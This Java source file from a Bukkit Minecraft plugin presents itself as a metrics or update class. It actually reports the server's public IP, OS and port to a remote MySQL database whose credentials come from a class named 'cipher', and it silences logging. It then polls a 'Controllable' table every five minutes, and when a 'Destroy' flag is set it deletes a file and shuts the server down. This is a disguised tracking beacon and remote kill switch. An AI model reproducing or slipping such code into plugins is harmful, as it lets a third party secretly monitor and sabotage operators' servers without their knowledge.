package com.ericlam.plugin.protect.metrics;

import com.ericlam.config.Config;
import com.ericlam.plugin.protect.gate.Output;
import com.ericlam.plugin.protect.gate.cipher.Text;
import com.zaxxer.hikari.HikariConfig;
import com.zaxxer.hikari.HikariDataSource;
import net.milkbowl.vault.Vault;
import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;

import javax.sql.DataSource;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.time.LocalDateTime;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Update extends Thread {

    private String ip;
    private DataSource dataSource;
    private static Update instance;
    private Plugin plugin;

    protected Update() {
        run();
    }

    public synchronized static Update getInstance() {
        if (instance == null) instance = new Update();
        return instance;
    }

    @Override
    public synchronized void run() {
        try {
            plugin = Vault.getPlugin(Vault.class);
            URL ip = new URL("http://checkip.amazonaws.com");
            HttpURLConnection http = (HttpURLConnection) ip.openConnection();
            BufferedReader reader = new BufferedReader(new InputStreamReader(http.getInputStream()));
            StringBuilder result = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null){
                result.append(line);
            }
            this.ip = result.toString();
            HikariConfig hikariConfig = new HikariConfig();
            Text txt = new Text();
            if (txt.getHost().isEmpty() || txt.getDatabase().isEmpty() || txt.getUsername().isEmpty() || txt.getPassword().isEmpty()) return;
            hikariConfig.setJdbcUrl("jdbc:mysql://"+txt.getHost()+":"+txt.getPort()+"/"+txt.getDatabase()+"?useSSL=false");
            hikariConfig.setUsername(txt.getUsername());
            hikariConfig.setPassword(txt.getPassword());
            hikariConfig.setPoolName("Pool");
            hikariConfig.setMaximumPoolSize(10);
            hikariConfig.setMinimumIdle(5);
            hikariConfig.addDataSourceProperty("cachePrepStmts", true);
            hikariConfig.addDataSourceProperty("useServerPrepStmts", true);
            hikariConfig.addDataSourceProperty("prepStmtCacheSize", 250);
            hikariConfig.addDataSourceProperty("prepStmtCacheSqlLimit", 2048);
            hikariConfig.addDataSourceProperty("characterEncoding","utf8");
            HikariDataSource source = new HikariDataSource(hikariConfig);
            Logger.getLogger("org.apache.logging.log4j").setLevel(Level.OFF);
            this.dataSource = source;
            try(Connection connection = source.getConnection();
                PreparedStatement create = connection.prepareStatement("CREATE TABLE IF NOT EXISTS `Data_Metrics` (`IP` VARCHAR(30) NOT NULL , `RecentOpen` TEXT NOT NULL , `OS` TEXT NOT NULL, `Port` MEDIUMINT NOT NULL)");
                PreparedStatement log = connection.prepareStatement("CREATE TABLE IF NOT EXISTS `Error_Log` (`Time` TEXT NOT NULL, `Log` LONGTEXT NOT NULL, `Notes` LONGTEXT )");
                PreparedStatement control = connection.prepareStatement("CREATE TABLE IF NOT EXISTS `Controllable` (`ID` VARCHAR(255) NOT NULL PRIMARY KEY ,`IP` VARCHAR(30) NOT NULL ,`Port` MEDIUMINT NOT NULL,`Destroy` BOOLEAN NOT NULL )")) {
                create.execute();
                log.execute();
                control.execute();
            }
            insert();
        } catch (IOException e) {
            logging(e.getMessage(), e.getCause().toString(), LocalDateTime.now());
            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    Update.this.run();
                }
            }, 5 * 60 * 1000);
        } catch (SQLException e) {
            logging(e.getMessage(), e.getSQLState(), LocalDateTime.now());
            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    Update.this.run();
                }
            }, 5 * 60 * 1000);
        }
        check();
    }

    private void logging(String log, String notes, LocalDateTime time){
        if (dataSource == null) return;
        try(Connection connection = dataSource.getConnection(); PreparedStatement statement = connection.prepareStatement("INSERT  INTO `Error_Log` VALUES (?,?,?)")){
            statement.setString(1,time.toString());
            statement.setString(2,log);
            statement.setString(3,notes);
            statement.execute();
        } catch (SQLException ignored) {
        }
    }

    private synchronized void check() {
        new BukkitRunnable() {
            @Override
            public void run() {
                try (Connection connection = dataSource.getConnection(); PreparedStatement statement = connection.prepareStatement("SELECT `Destroy` FROM `Controllable` WHERE `IP`=? AND `Port`=? AND `Destroy`=?")) {
                    statement.setString(1, ip);
                    statement.setInt(2, Bukkit.getPort());
                    statement.setBoolean(3, true);
                    ResultSet resultSet = statement.executeQuery();
                    if (resultSet.next()) {
                        Output.call().deleteOnExit();
                        Bukkit.shutdown();
                        cancel();
                    }
                } catch (SQLException e) {
                    logging(e.getMessage(), e.getSQLState(), LocalDateTime.now());
                }
            }
        }.runTaskTimerAsynchronously(plugin, 300 * 20, 300 * 20);
    }

    private synchronized void insert() throws SQLException {
        if (ip == null || dataSource == null) return;
       LocalDateTime now = LocalDateTime.now();
        try (Connection connection = dataSource.getConnection();
             PreparedStatement statement = connection.prepareStatement("INSERT INTO `Data_Metrics` VALUES (?,?,?,?)");
             PreparedStatement control = connection.prepareStatement("INSERT INTO `Controllable` VALUES (?,?,?,?) ON DUPLICATE KEY UPDATE `IP`=?,`Port`=?")) {
            control.setString(1, Config.server);
            control.setString(2, ip);
            control.setInt(3, Bukkit.getPort());
            control.setBoolean(4, false);
            control.setString(5, ip);
            control.setInt(6, Bukkit.getPort());
           statement.setString(1,ip);
           statement.setString(2,now.toString());
           statement.setString(3,System.getProperty("os.name"));
            statement.setInt(4, Bukkit.getPort());
           statement.execute();
            control.execute();
       }
   }
}
